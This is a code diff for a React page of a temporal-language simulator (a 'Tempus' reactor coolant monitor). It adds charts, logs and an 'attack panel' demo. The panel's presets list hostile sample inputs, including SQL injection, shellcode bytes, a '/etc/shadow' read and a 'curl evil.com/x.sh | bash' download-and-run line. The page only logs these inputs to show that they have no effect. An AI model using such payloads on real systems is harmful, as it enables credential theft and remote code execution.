@@ -4,7 +4,7 @@ import Link from 'next/link';
 import { lex }           from '../lib/tempus/lexer';
 import { parse }         from '../lib/tempus/parser';
 import { buildRuntime, createSimulator } from '../lib/tempus/runtime';
-import type { SimEvent, CellDecl } from '../lib/tempus/types';
+import type { SimEvent, CellDecl, ParsedProgram } from '../lib/tempus/types';
 
 // ── Default program ───────────────────────────────────────────────────────────
 const DEFAULT = `-- Nuclear coolant temperature monitor
@@ -28,7 +28,7 @@ when CRITICAL do begin
                  fire emergency_shutdown
                end`;
 
-// ── Colours ───────────────────────────────────────────────────────────────────
+// ── Palette ───────────────────────────────────────────────────────────────────
 const PALETTE = ['#58E6D9','#f59e0b','#f97316','#ef4444','#60a5fa','#a78bfa','#34d399','#fb923c'];
 const ANOMALY = '#4b5563';
 
@@ -39,34 +39,21 @@ function cellPalette(names: string[]): Map<string, string> {
   return m;
 }
 
-// ── Axis helpers ─────────────────────────────────────────────────────────────
-function fmtSci(v: number): string {
-  if (v === 0) return '0';
-  const e = Math.floor(Math.log10(Math.abs(v)));
-  const m = v / Math.pow(10, e);
-  return `${m.toFixed(1)}e${e}`;
+// ── Formatters ────────────────────────────────────────────────────────────────
+function fmtDP(v: number): string {
+  const a = Math.abs(v);
+  if (a === 0) return '0';
+  if (a < 1e-6) return `${(v * 1e9).toFixed(1)} ns`;
+  if (a < 1e-3) return `${(v * 1e6).toFixed(2)} µs`;
+  return `${(v * 1e3).toFixed(2)} ms`;
 }
 
-function drawGrid(
-  ctx: CanvasRenderingContext2D,
-  W: number, H: number,
-  padL: number, padR: number, padT: number, padB: number
-) {
-  const iW = W - padL - padR;
-  const iH = H - padT - padB;
-  ctx.strokeStyle = 'rgba(255,255,255,0.06)';
-  ctx.lineWidth = 0.5;
-  for (let i = 1; i < 5; i++) {
-    const x = padL + (iW * i) / 5;
-    ctx.beginPath(); ctx.moveTo(x, padT); ctx.lineTo(x, padT + iH); ctx.stroke();
-  }
-  for (let i = 1; i < 4; i++) {
-    const y = padT + (iH * i) / 4;
-    ctx.beginPath(); ctx.moveTo(padL, y); ctx.lineTo(padL + iW, y); ctx.stroke();
-  }
+function nowStamp(): string {
+  const d = new Date();
+  return `${String(d.getMinutes()).padStart(2,'0')}:${String(d.getSeconds()).padStart(2,'0')}.${String(d.getMilliseconds()).padStart(3,'0')}`;
 }
 
-// ── Chart 1: ΔP scatter with cell bands ──────────────────────────────────────
+// ── Chart 1: ΔP timeline (canvas) ────────────────────────────────────────────
 function drawDpScatter(
   canvas: HTMLCanvasElement | null,
   events: SimEvent[],
@@ -80,10 +67,10 @@ function drawDpScatter(
 
   const ctx = canvas.getContext('2d')!;
   ctx.clearRect(0, 0, W, H);
-  ctx.fillStyle = '#0a0a12';
+  ctx.fillStyle = '#070c09';
   ctx.fillRect(0, 0, W, H);
 
-  const PAD = { l: 46, r: 10, t: 10, b: 28 };
+  const PAD = { l: 54, r: 10, t: 14, b: 28 };
   const iW = W - PAD.l - PAD.r;
   const iH = H - PAD.t - PAD.b;
 
@@ -95,285 +82,527 @@ function drawDpScatter(
   const xS = (i: number) => PAD.l + (i / Math.max(events.length - 1, 1)) * iW;
   const yS = (v: number) => PAD.t + iH - ((v - yMin) / yRange) * iH;
 
-  // cell band fills
+  // cell bands
   for (const [name, cell] of cells) {
     const col = colors.get(name) ?? '#888';
     const y1  = yS(cell.hi);
     const y2  = yS(cell.lo);
-    ctx.fillStyle = col + '18';
+    ctx.fillStyle = col + '15';
     ctx.fillRect(PAD.l, y1, iW, y2 - y1);
-    ctx.strokeStyle = col + '45';
+    ctx.strokeStyle = col + '38';
     ctx.lineWidth = 0.5;
     ctx.beginPath(); ctx.moveTo(PAD.l, y1); ctx.lineTo(PAD.l + iW, y1); ctx.stroke();
-    // band label
-    ctx.fillStyle = col + '90';
-    ctx.font = '8px Montserrat, monospace';
+    ctx.fillStyle = col + '65';
+    ctx.font = '8px monospace';
     ctx.textAlign = 'left';
     ctx.fillText(name, PAD.l + 3, (y1 + y2) / 2 + 3);
   }
 
-  drawGrid(ctx, W, H, PAD.l, PAD.r, PAD.t, PAD.b);
+  // grid
+  ctx.strokeStyle = 'rgba(255,255,255,0.04)';
+  ctx.lineWidth = 0.5;
+  for (let i = 1; i < 5; i++) {
+    const x = PAD.l + (iW * i) / 5;
+    ctx.beginPath(); ctx.moveTo(x, PAD.t); ctx.lineTo(x, PAD.t + iH); ctx.stroke();
+  }
+  for (let i = 1; i < 4; i++) {
+    const y = PAD.t + (iH * i) / 4;
+    ctx.beginPath(); ctx.moveTo(PAD.l, y); ctx.lineTo(PAD.l + iW, y); ctx.stroke();
+  }
 
   // dots
   for (const ev of events) {
-    const x   = xS(ev.index);
-    const y   = yS(ev.dp);
+    const x = xS(ev.index);
+    const y = yS(ev.dp);
     const col = colors.get(ev.cell) ?? ANOMALY;
     ctx.beginPath();
-    ctx.arc(x, y, ev.actionFired ? 3 : 1.8, 0, Math.PI * 2);
-    ctx.fillStyle = ev.actionFired ? col : col + 'aa';
+    ctx.arc(x, y, ev.actionFired ? 3.5 : 1.8, 0, Math.PI * 2);
+    ctx.fillStyle = ev.actionFired ? col : col + 'a0';
     ctx.fill();
   }
 
-  // axes labels
-  ctx.fillStyle = 'rgba(255,255,255,0.45)';
-  ctx.font = '8px Montserrat, monospace';
+  // axis labels
+  ctx.fillStyle = 'rgba(255,255,255,0.35)';
+  ctx.font = '8px monospace';
   ctx.textAlign = 'right';
-  ctx.fillText(fmtSci(yMax), PAD.l - 2, PAD.t + 6);
-  ctx.fillText(fmtSci(yMin), PAD.l - 2, PAD.t + iH);
-  ctx.textAlign = 'left';
-  ctx.fillText('0', PAD.l + 2, PAD.t + iH + 10);
-  ctx.textAlign = 'right';
-  ctx.fillText(`${events.length}`, PAD.l + iW, PAD.t + iH + 10);
+  ctx.fillText(fmtDP(yMax), PAD.l - 3, PAD.t + 7);
+  ctx.fillText(fmtDP(yMin), PAD.l - 3, PAD.t + iH + 1);
+  ctx.textAlign = 'center';
+  ctx.fillText('0', PAD.l, PAD.t + iH + 12);
+  ctx.fillText(String(events.length), PAD.l + iW, PAD.t + iH + 12);
 
-  // chart title
-  ctx.fillStyle = 'rgba(255,255,255,0.3)';
-  ctx.font = '9px Montserrat, monospace';
+  ctx.fillStyle = 'rgba(255,255,255,0.25)';
+  ctx.font = '9px monospace';
   ctx.textAlign = 'left';
-  ctx.fillText('ΔP  TIMELINE', PAD.l + 4, PAD.t + 9);
+  ctx.fillText('ΔP  TIMELINE', PAD.l + 4, PAD.t + 10);
 }
 
-// ── Chart 2: cell hit frequency (bar) ────────────────────────────────────────
-function drawCellBar(
-  canvas: HTMLCanvasElement | null,
-  events: SimEvent[],
-  cells:  Map<string, CellDecl>,
-  colors: Map<string, string>
-) {
-  if (!canvas) return;
-  const W = canvas.width  = canvas.offsetWidth;
-  const H = canvas.height = canvas.offsetHeight;
-  if (W === 0 || H === 0) return;
-
-  const ctx = canvas.getContext('2d')!;
-  ctx.clearRect(0, 0, W, H);
-  ctx.fillStyle = '#0a0a12';
-  ctx.fillRect(0, 0, W, H);
-
-  const PAD = { l: 10, r: 10, t: 18, b: 36 };
-  const names = [...Array.from(cells.keys()), 'anomaly'];
-  const counts = new Map<string, number>();
-  names.forEach(n => counts.set(n, 0));
-  events.forEach(e => counts.set(e.cell, (counts.get(e.cell) ?? 0) + 1));
-
-  const maxCount = Math.max(...Array.from(counts.values()), 1);
-  const iW = W - PAD.l - PAD.r;
-  const iH = H - PAD.t - PAD.b;
-  const bW  = iW / names.length;
-
-  drawGrid(ctx, W, H, PAD.l, PAD.r, PAD.t, PAD.b);
-
-  names.forEach((name, i) => {
-    const count = counts.get(name) ?? 0;
-    const col   = colors.get(name) ?? ANOMALY;
-    const x     = PAD.l + i * bW;
-    const bH    = (count / maxCount) * iH;
-    const y     = PAD.t + iH - bH;
-
-    ctx.fillStyle = col + '30';
-    ctx.fillRect(x + 2, PAD.t, bW - 4, iH);
-    ctx.fillStyle = col;
-    ctx.fillRect(x + 2, y, bW - 4, bH);
-
-    // label
-    ctx.fillStyle = col;
-    ctx.font = '8px Montserrat, monospace';
-    ctx.textAlign = 'center';
-    ctx.fillText(name, x + bW / 2, H - PAD.b + 12);
-    if (count > 0) {
-      ctx.fillStyle = 'rgba(255,255,255,0.7)';
-      ctx.fillText(String(count), x + bW / 2, y - 3);
-    }
-  });
-
-  ctx.fillStyle = 'rgba(255,255,255,0.3)';
-  ctx.font = '9px Montserrat, monospace';
-  ctx.textAlign = 'left';
-  ctx.fillText('CELL  FREQUENCY', PAD.l + 4, PAD.t - 4);
+// ── Cell registry (React) ─────────────────────────────────────────────────────
+function CellRegistry({ cells, colors, whens, counts, activeCell }: {
+  cells:      Map<string, CellDecl>;
+  colors:     Map<string, string>;
+  whens:      Map<string, string[]>;
+  counts:     Map<string, number>;
+  activeCell: string | null;
+}) {
+  return (
+    <div style={{ height:'100%', display:'flex', flexDirection:'column', overflow:'hidden' }}>
+      <div style={{ padding:'8px 12px 4px', fontSize:8, letterSpacing:'0.16em',
+                    color:'rgba(255,255,255,0.22)', fontFamily:'monospace', flexShrink:0 }}>
+        CELL  REGISTRY  Γ
+      </div>
+      <div style={{ flex:1, overflowY:'auto', padding:'0 8px 8px' }}>
+        {Array.from(cells.values()).map(cell => {
+          const col    = colors.get(cell.name) ?? '#888';
+          const acts   = whens.get(cell.name) ?? [];
+          const hits   = counts.get(cell.name) ?? 0;
+          const active = cell.name === activeCell;
+          return (
+            <div key={cell.name} style={{
+              padding:'7px 9px', marginBottom:3,
+              border:`1px solid ${active ? col + 'aa' : 'rgba(255,255,255,0.05)'}`,
+              background: active ? col + '12' : 'rgba(255,255,255,0.015)',
+              boxShadow: active ? `0 0 14px ${col}28` : 'none',
+              transition:'all 0.15s',
+            }}>
+              <div style={{ display:'flex', justifyContent:'space-between', alignItems:'baseline' }}>
+                <span style={{ fontFamily:'monospace', fontSize:11, color: active ? col : col + 'bb',
+                               fontWeight: active ? 700 : 400, letterSpacing:'0.04em' }}>
+                  {cell.name}
+                </span>
+                <span style={{ fontFamily:'monospace', fontSize:10, color:'rgba(255,255,255,0.22)' }}>
+                  {hits}
+                </span>
+              </div>
+              <div style={{ fontFamily:'monospace', fontSize:9, color:'rgba(255,255,255,0.28)', marginTop:2 }}>
+                [{fmtDP(cell.lo)},  {fmtDP(cell.hi)}]
+              </div>
+              {acts.length > 0 && (
+                <div style={{ fontFamily:'monospace', fontSize:9, marginTop:2,
+                              color: active ? col + 'cc' : 'rgba(255,255,255,0.18)',
+                              fontStyle:'italic', whiteSpace:'nowrap', overflow:'hidden', textOverflow:'ellipsis' }}>
+                  {acts[0]}
+                </div>
+              )}
+            </div>
+          );
+        })}
+      </div>
+    </div>
+  );
 }
 
-// ── Chart 3: channel event distribution (horizontal bars) ────────────────────
-function drawChannelBar(
-  canvas:   HTMLCanvasElement | null,
-  events:   SimEvent[],
-  channels: string[]
-) {
-  if (!canvas) return;
-  const W = canvas.width  = canvas.offsetWidth;
-  const H = canvas.height = canvas.offsetHeight;
-  if (W === 0 || H === 0) return;
-
-  const ctx = canvas.getContext('2d')!;
-  ctx.clearRect(0, 0, W, H);
-  ctx.fillStyle = '#0a0a12';
-  ctx.fillRect(0, 0, W, H);
-
-  const PAD = { l: 70, r: 14, t: 18, b: 14 };
-  const counts = new Map<string, number>();
-  channels.forEach(c => counts.set(c, 0));
-  events.forEach(e => counts.set(e.channel, (counts.get(e.channel) ?? 0) + 1));
-  const maxC = Math.max(...Array.from(counts.values()), 1);
-  const iW   = W - PAD.l - PAD.r;
-  const iH   = H - PAD.t - PAD.b;
-  const rowH = iH / Math.max(channels.length, 1);
-
-  channels.forEach((ch, i) => {
-    const count = counts.get(ch) ?? 0;
-    const barW  = (count / maxC) * iW;
-    const y     = PAD.t + i * rowH + rowH * 0.15;
-    const bH    = rowH * 0.7;
-
-    ctx.fillStyle = PALETTE[i % PALETTE.length] + '25';
-    ctx.fillRect(PAD.l, y, iW, bH);
-    ctx.fillStyle = PALETTE[i % PALETTE.length];
-    ctx.fillRect(PAD.l, y, barW, bH);
-
-    ctx.fillStyle = 'rgba(255,255,255,0.6)';
-    ctx.font = '9px Montserrat, monospace';
-    ctx.textAlign = 'right';
-    ctx.fillText(ch, PAD.l - 4, y + bH * 0.72);
-    ctx.textAlign = 'left';
-    if (count > 0) ctx.fillText(String(count), PAD.l + barW + 4, y + bH * 0.72);
-  });
-
-  ctx.fillStyle = 'rgba(255,255,255,0.3)';
-  ctx.font = '9px Montserrat, monospace';
-  ctx.textAlign = 'left';
-  ctx.fillText('CHANNEL  ACTIVITY', PAD.l + 4, PAD.t - 4);
-}
-
-// ── Chart 4: action dispatch counts (bar) ────────────────────────────────────
-function drawActionBar(
-  canvas: HTMLCanvasElement | null,
-  events: SimEvent[],
-  colors: Map<string, string>
-) {
-  if (!canvas) return;
-  const W = canvas.width  = canvas.offsetWidth;
-  const H = canvas.height = canvas.offsetHeight;
-  if (W === 0 || H === 0) return;
-
-  const ctx = canvas.getContext('2d')!;
-  ctx.clearRect(0, 0, W, H);
-  ctx.fillStyle = '#0a0a12';
-  ctx.fillRect(0, 0, W, H);
-
-  const PAD = { l: 10, r: 10, t: 18, b: 44 };
-
-  const counts = new Map<string, number>();
-  events.forEach(e => {
-    if (e.actionFired) counts.set(e.actionFired, (counts.get(e.actionFired) ?? 0) + 1);
-  });
-  const entries = Array.from(counts.entries());
-  if (entries.length === 0) {
-    ctx.fillStyle = 'rgba(255,255,255,0.15)';
-    ctx.font = '9px Montserrat, monospace';
-    ctx.textAlign = 'center';
-    ctx.fillText('no dispatches yet', W / 2, H / 2);
-    ctx.textAlign = 'left';
-    ctx.fillText('ACTION  DISPATCH', PAD.l + 4, PAD.t - 4);
-    return;
+// ── ΔP density + partition (SVG) ─────────────────────────────────────────────
+function DpPartition({ cells, colors, counts, lastDP }: {
+  cells:   Map<string, CellDecl>;
+  colors:  Map<string, string>;
+  counts:  Map<string, number>;
+  lastDP:  number | null;
+}) {
+  const cellArr = Array.from(cells.values());
+  if (cellArr.length === 0) {
+    return (
+      <div style={{ height:'100%', display:'flex', alignItems:'center', justifyContent:'center',
+                    fontSize:10, color:'rgba(255,255,255,0.1)', fontStyle:'italic', fontFamily:'monospace' }}>
+        ΔP partition
+      </div>
+    );
   }
 
-  const maxC = Math.max(...entries.map(([, v]) => v));
-  const iW   = W - PAD.l - PAD.r;
-  const iH   = H - PAD.t - PAD.b;
-  const bW   = iW / entries.length;
+  const xMin  = Math.min(...cellArr.map(c => c.lo));
+  const xMax  = Math.max(...cellArr.map(c => c.hi));
+  const range = xMax - xMin || 1;
 
-  drawGrid(ctx, W, H, PAD.l, PAD.r, PAD.t, PAD.b);
+  const W = 600, H = 130;
+  const m = { l: 54, r: 10, t: 12, b: 30 };
+  const iW = W - m.l - m.r;
+  const iH = H - m.t - m.b;   // usable height
+  const barH = iH * 0.58;      // histogram portion
+  const bandY = m.t + barH + 4; // cell band y
+  const bandH = 20;
 
-  entries.forEach(([action, count], i) => {
-    const col = PALETTE[i % PALETTE.length];
-    const x   = PAD.l + i * bW;
-    const bH  = (count / maxC) * iH;
-    const y   = PAD.t + iH - bH;
+  const xS = (v: number) => m.l + ((v - xMin) / range) * iW;
 
-    ctx.fillStyle = col + '28';
-    ctx.fillRect(x + 2, PAD.t, bW - 4, iH);
-    ctx.fillStyle = col;
-    ctx.fillRect(x + 2, y, bW - 4, bH);
+  const totalHits = Array.from(counts.values()).reduce((a, b) => a + b, 0) || 1;
 
-    ctx.fillStyle = 'rgba(255,255,255,0.7)';
-    ctx.font = '7px Montserrat, monospace';
-    ctx.textAlign = 'center';
-    // truncate long action strings
-    const label = action.length > 18 ? action.slice(0, 16) + '…' : action;
-    ctx.save();
-    ctx.translate(x + bW / 2, H - PAD.b + 6);
-    ctx.rotate(-Math.PI / 5);
-    ctx.fillText(label, 0, 0);
-    ctx.restore();
-
-    if (count > 0) {
-      ctx.fillStyle = 'rgba(255,255,255,0.75)';
-      ctx.font = '8px Montserrat, monospace';
-      ctx.textAlign = 'center';
-      ctx.fillText(String(count), x + bW / 2, y - 3);
-    }
+  // density = hits / (cell_width * total) — normalised
+  const densities = cellArr.map(cell => {
+    const w = cell.hi - cell.lo;
+    return w > 0 ? (counts.get(cell.name) ?? 0) / (w * totalHits) : 0;
   });
+  const maxDens = Math.max(...densities, 1e-12);
 
-  ctx.fillStyle = 'rgba(255,255,255,0.3)';
-  ctx.font = '9px Montserrat, monospace';
-  ctx.textAlign = 'left';
-  ctx.fillText('ACTION  DISPATCH', PAD.l + 4, PAD.t - 4);
+  return (
+    <div style={{ height:'100%', display:'flex', flexDirection:'column' }}>
+      <svg viewBox={`0 0 ${W} ${H}`} preserveAspectRatio="xMidYMid meet"
+           style={{ width:'100%', flex:1, minHeight:0, display:'block', background:'#070c09' }}>
+
+        {/* title */}
+        <text x={m.l + 4} y={10} fill="rgba(255,255,255,0.25)" fontSize={8} fontFamily="monospace">
+          ΔP  DENSITY  +  PARTITION
+        </text>
+
+        {/* density bars */}
+        {cellArr.map((cell, i) => {
+          const col  = colors.get(cell.name) ?? '#888';
+          const x1   = xS(cell.lo);
+          const x2   = xS(cell.hi);
+          const bh   = (densities[i] / maxDens) * barH;
+          return (
+            <g key={cell.name}>
+              {/* bg track */}
+              <rect x={x1} y={m.t} width={x2 - x1} height={barH} fill={col + '0a'} />
+              {/* density bar */}
+              <rect x={x1 + 1} y={m.t + barH - bh} width={Math.max(0, x2 - x1 - 2)} height={bh}
+                    fill={col + '60'} />
+            </g>
+          );
+        })}
+
+        {/* bar baseline */}
+        <line x1={m.l} y1={m.t + barH} x2={m.l + iW} y2={m.t + barH}
+              stroke="rgba(255,255,255,0.12)" strokeWidth={0.5} />
+
+        {/* cell bands */}
+        {cellArr.map(cell => {
+          const col = colors.get(cell.name) ?? '#888';
+          const x1  = xS(cell.lo);
+          const x2  = xS(cell.hi);
+          return (
+            <g key={cell.name + '-band'}>
+              <rect x={x1} y={bandY} width={x2 - x1} height={bandH} fill={col + '25'} />
+              <line x1={x1} y1={bandY} x2={x1} y2={bandY + bandH} stroke={col + '70'} strokeWidth={1} />
+              <text x={(x1 + x2) / 2} y={bandY + 13} textAnchor="middle"
+                    fill={col + 'cc'} fontSize={8} fontFamily="monospace">
+                {cell.name}
+              </text>
+            </g>
+          );
+        })}
+
+        {/* x axis */}
+        <line x1={m.l} y1={bandY + bandH} x2={m.l + iW} y2={bandY + bandH}
+              stroke="#5e5d54" strokeWidth={0.5} />
+
+        {/* tick labels */}
+        {[xMin, (xMin + xMax) / 2, xMax].map((v, i) => (
+          <text key={i} x={xS(v)} y={H - 6} textAnchor="middle"
+                fill="#5e5d54" fontSize={8} fontFamily="monospace">
+            {fmtDP(v)}
+          </text>
+        ))}
+
+        {/* current event marker */}
+        {lastDP !== null && (
+          <g>
+            <line x1={xS(Math.max(xMin, Math.min(xMax, lastDP)))} y1={m.t}
+                  x2={xS(Math.max(xMin, Math.min(xMax, lastDP)))} y2={bandY + bandH}
+                  stroke="#58E6D9" strokeWidth={1.5} strokeOpacity={0.85} />
+            <circle cx={xS(Math.max(xMin, Math.min(xMax, lastDP)))} cy={m.t} r={3} fill="#58E6D9" />
+          </g>
+        )}
+      </svg>
+    </div>
+  );
+}
+
+// ── Action log (React) ────────────────────────────────────────────────────────
+interface ActionEntry {
+  ts:     string;
+  cell:   string;
+  action: string;
+  dp:     number;
+  color:  string;
+}
+
+function ActionLog({ entries }: { entries: ActionEntry[] }) {
+  if (entries.length === 0) {
+    return (
+      <div style={{ height:'100%', display:'flex', flexDirection:'column' }}>
+        <div style={{ padding:'8px 12px 4px', fontSize:8, letterSpacing:'0.16em',
+                      color:'rgba(255,255,255,0.22)', fontFamily:'monospace' }}>
+          ACTION  LOG
+        </div>
+        <div style={{ flex:1, display:'flex', alignItems:'center', justifyContent:'center',
+                      fontSize:10, color:'rgba(255,255,255,0.1)', fontStyle:'italic', fontFamily:'monospace' }}>
+          no dispatches yet
+        </div>
+      </div>
+    );
+  }
+
+  return (
+    <div style={{ height:'100%', display:'flex', flexDirection:'column', overflow:'hidden' }}>
+      <div style={{ padding:'8px 12px 4px', fontSize:8, letterSpacing:'0.16em',
+                    color:'rgba(255,255,255,0.22)', fontFamily:'monospace', flexShrink:0 }}>
+        ACTION  LOG
+      </div>
+      <div style={{ flex:1, overflowY:'auto' }}>
+        {entries.map((e, i) => (
+          <div key={i} style={{
+            display:'grid', gridTemplateColumns:'52px 1fr 58px',
+            gap:'0 7px', padding:'4px 10px',
+            borderBottom:'1px solid rgba(255,255,255,0.03)',
+            fontSize:10, fontFamily:'monospace',
+          }}>
+            <span style={{ color:'rgba(255,255,255,0.22)' }}>{e.ts}</span>
+            <div style={{ minWidth:0 }}>
+              <span style={{ color: e.color, fontWeight:600 }}>{e.cell}</span>
+              <span style={{ color:'rgba(255,255,255,0.38)', marginLeft:6,
+                             whiteSpace:'nowrap', overflow:'hidden', textOverflow:'ellipsis',
+                             display:'inline-block', maxWidth:'calc(100% - 70px)', verticalAlign:'bottom' }}>
+                {e.action}
+              </span>
+            </div>
+            <span style={{ color:'rgba(255,255,255,0.25)', textAlign:'right', fontSize:9 }}>
+              {fmtDP(e.dp)}
+            </span>
+          </div>
+        ))}
+      </div>
+    </div>
+  );
+}
+
+// ── State strip ───────────────────────────────────────────────────────────────
+function StateStrip({ phase, cycle, lastDP, activeCell, lastAction, colors }: {
+  phase:      string;
+  cycle:      number;
+  lastDP:     number | null;
+  activeCell: string | null;
+  lastAction: string | null;
+  colors:     Map<string, string>;
+}) {
+  const phaseCol  = phase === 'EXECUTE' ? '#f59e0b' : phase === 'COMPILE' ? '#60a5fa' : '#4b5563';
+  const phaseGlow = phase === 'EXECUTE' ? 'rgba(245,158,11,0.18)' : 'transparent';
+  const cellCol   = activeCell ? (colors.get(activeCell) ?? 'rgba(255,255,255,0.6)') : 'rgba(255,255,255,0.25)';
+
+  const items = [
+    {
+      k: 'Phase σ',
+      v: (
+        <span style={{
+          display:'inline-block', padding:'2px 7px',
+          border:`1px solid ${phaseCol}`, color: phaseCol,
+          fontSize:10, fontFamily:'monospace', letterSpacing:'0.1em',
+          background: phaseGlow, boxShadow: phase === 'EXECUTE' ? `0 0 10px ${phaseGlow}` : 'none',
+        }}>
+          {phase}
+        </span>
+      ),
+    },
+    { k: 'Cycle M',     v: cycle > 0 ? cycle.toLocaleString() : '—', c: 'rgba(255,255,255,0.7)' },
+    { k: 'ΔP(k)',       v: lastDP !== null ? fmtDP(lastDP) : '—',    c: 'rgba(255,255,255,0.7)' },
+    { k: 'Cell',        v: activeCell ?? '—',                         c: cellCol },
+    { k: 'Last action', v: lastAction ?? '—',                         c: 'rgba(255,255,255,0.45)', small: true },
+  ] as const;
+
+  return (
+    <div style={{
+      display:'grid', gridTemplateColumns:'repeat(5, 1fr)',
+      borderBottom:'1px solid rgba(255,255,255,0.07)',
+      background:'#080e0b', flexShrink:0,
+    }}>
+      {items.map((item, i) => (
+        <div key={i} style={{
+          padding:'9px 14px',
+          borderRight: i < 4 ? '1px solid rgba(255,255,255,0.04)' : 'none',
+        }}>
+          <div style={{ fontSize:8, letterSpacing:'0.14em', color:'rgba(255,255,255,0.22)',
+                        fontFamily:'monospace', textTransform:'uppercase', marginBottom:4 }}>
+            {item.k}
+          </div>
+          {'v' in item && typeof item.v === 'string' ? (
+            <div style={{ fontSize: 'small' in item && item.small ? 10 : 14,
+                          color: 'c' in item ? item.c : undefined,
+                          fontFamily:'monospace', fontWeight:600, lineHeight:1.2,
+                          whiteSpace:'nowrap', overflow:'hidden', textOverflow:'ellipsis' }}>
+              {item.v}
+            </div>
+          ) : (
+            <div>{item.v}</div>
+          )}
+        </div>
+      ))}
+    </div>
+  );
+}
+
+// ── Attack panel (Structural Incorruptibility demo) ───────────────────────────
+const ATTACK_PRESETS: Record<string, string> = {
+  'SQL':  `'; DROP TABLE reactor_logs; --\nUNION SELECT password FROM admin_users WHERE '1'='1\nALTER TABLE cells DROP COLUMN bounds; --`,
+  'BOF':  `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\\x90\\x90\\x90\\x90\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0`,
+  'CMD':  `; cat /etc/shadow\n|| curl evil.com/x.sh | bash\n$(wget reactor.local/scram -O -)`,
+  'JSON': `{"op":"emergency_shutdown","authorized":true,"by":"admin"}\n{"cell":"CRITICAL","force_dispatch":true}\n{"override":{"cell_map":{"MELT":{"action":"meltdown"}}}}`,
+};
+
+interface AttackEntry { ts: string; bytes: number; label: string; }
+
+function AttackPanel({ cells }: { cells: Map<string, CellDecl> }) {
+  const [payload, setPayload] = useState(
+    `'; DROP TABLE reactor_logs; --\n\nAAAAAAAAAAAAAAAAAAAA\\x90\\x90\\x90\\xeb\\x1f\n\n{"op":"emergency_shutdown","authorized":true}`
+  );
+  const [log,   setLog]   = useState<AttackEntry[]>([]);
+  const [stats, setStats] = useState({ injections: 0, bytes: 0 });
+
+  const inject = useCallback((text: string) => {
+    setLog(prev => [{
+      ts:    nowStamp(),
+      bytes: text.length,
+      label: text.slice(0, 55).replace(/[\r\n]+/g, ' '),
+    }, ...prev].slice(0, 60));
+    setStats(s => ({ injections: s.injections + 1, bytes: s.bytes + text.length }));
+  }, []);
+
+  const flood = useCallback(() => {
+    for (let i = 0; i < 100; i++) setTimeout(() => inject(payload + `\n#${i}`), i * 8);
+  }, [payload, inject]);
+
+  return (
+    <div style={{ display:'flex', flexDirection:'column', height:'100%', overflow:'hidden' }}>
+
+      {/* explainer */}
+      <div style={{ padding:'10px 14px', background:'#0a1209',
+                    borderBottom:'1px solid rgba(255,255,255,0.05)',
+                    fontSize:11, fontFamily:'monospace', color:'rgba(255,255,255,0.35)', lineHeight:1.55 }}>
+        A temporal system has <span style={{ color:'#58E6D9' }}>no content parser</span>.
+        The only datum a pulse contributes is <em style={{ color:'rgba(255,255,255,0.65)' }}>when it arrived</em>.
+        Inject any payload — the action set stays bounded by the compiled cell registry.{' '}
+        <span style={{ color:'rgba(255,255,255,0.2)' }}>Thm. 6.1</span>
+      </div>
+
+      {/* payload editor */}
+      <div style={{ padding:'10px 12px', borderBottom:'1px solid rgba(255,255,255,0.05)', flexShrink:0 }}>
+        <textarea
+          value={payload}
+          onChange={e => setPayload(e.target.value)}
+          spellCheck={false}
+          style={{ width:'100%', background:'#0c0808', color:'#ef4444', fontFamily:'monospace',
+                   fontSize:11, lineHeight:1.6, padding:'9px 11px',
+                   border:'1px solid rgba(239,68,68,0.2)', resize:'vertical',
+                   minHeight:76, outline:'none', boxSizing:'border-box' }}
+        />
+        <div style={{ display:'flex', gap:5, flexWrap:'wrap', marginTop:7 }}>
+          {Object.entries(ATTACK_PRESETS).map(([k, v]) => (
+            <button key={k} onClick={() => setPayload(v)}
+              style={{ fontFamily:'monospace', fontSize:9, letterSpacing:'0.06em', padding:'3px 7px',
+                       border:'1px solid rgba(255,255,255,0.1)', background:'transparent',
+                       color:'rgba(255,255,255,0.35)', cursor:'pointer' }}>
+              {k}
+            </button>
+          ))}
+        </div>
+        <div style={{ display:'flex', gap:7, marginTop:8 }}>
+          <button onClick={() => inject(payload)}
+            style={{ fontFamily:'monospace', fontSize:10, letterSpacing:'0.1em', padding:'5px 14px',
+                     background:'rgba(239,68,68,0.12)', color:'#ef4444',
+                     border:'1px solid rgba(239,68,68,0.4)', cursor:'pointer' }}>
+            INJECT
+          </button>
+          <button onClick={flood}
+            style={{ fontFamily:'monospace', fontSize:10, letterSpacing:'0.1em', padding:'5px 14px',
+                     background:'transparent', color:'rgba(255,255,255,0.3)',
+                     border:'1px solid rgba(255,255,255,0.1)', cursor:'pointer' }}>
+            FLOOD ×100
+          </button>
+          <button onClick={() => { setLog([]); setStats({ injections: 0, bytes: 0 }); }}
+            style={{ fontFamily:'monospace', fontSize:10, letterSpacing:'0.1em', padding:'5px 14px',
+                     background:'transparent', color:'rgba(255,255,255,0.18)',
+                     border:'1px solid rgba(255,255,255,0.07)', cursor:'pointer', marginLeft:'auto' }}>
+            RESET
+          </button>
+        </div>
+      </div>
+
+      {/* counters */}
+      <div style={{ display:'grid', gridTemplateColumns:'1fr 1fr 1fr 1fr',
+                    borderBottom:'1px solid rgba(255,255,255,0.05)', flexShrink:0 }}>
+        {[
+          ['INJECTED',  String(stats.injections),                  undefined],
+          ['BYTES',     stats.bytes.toLocaleString(),               undefined],
+          ['PARSERS',   '0',                                        '#34d399'],
+          ['|Cells(A)|', String(cells.size),                       '#58E6D9'],
+        ].map(([k, v, c]) => (
+          <div key={k as string} style={{ padding:'9px 8px', textAlign:'center',
+                                          borderRight:'1px solid rgba(255,255,255,0.04)' }}>
+            <div style={{ fontSize:8, letterSpacing:'0.12em', color:'rgba(255,255,255,0.2)',
+                          fontFamily:'monospace' }}>{k}</div>
+            <div style={{ fontSize:15, color: (c ?? 'rgba(255,255,255,0.65)') as string,
+                          fontFamily:'monospace', fontWeight:700, marginTop:2 }}>{v}</div>
+          </div>
+        ))}
+      </div>
+
+      {/* injection log */}
+      <div style={{ flex:1, overflowY:'auto' }}>
+        {log.length === 0 ? (
+          <div style={{ textAlign:'center', padding:'24px 16px', fontFamily:'monospace', fontSize:10,
+                        color:'rgba(255,255,255,0.12)', fontStyle:'italic' }}>
+            no injections yet
+          </div>
+        ) : log.map((e, i) => (
+          <div key={i} style={{ display:'grid', gridTemplateColumns:'52px 42px 1fr',
+                                gap:'0 7px', padding:'4px 12px',
+                                borderBottom:'1px solid rgba(255,255,255,0.03)',
+                                fontSize:10, fontFamily:'monospace' }}>
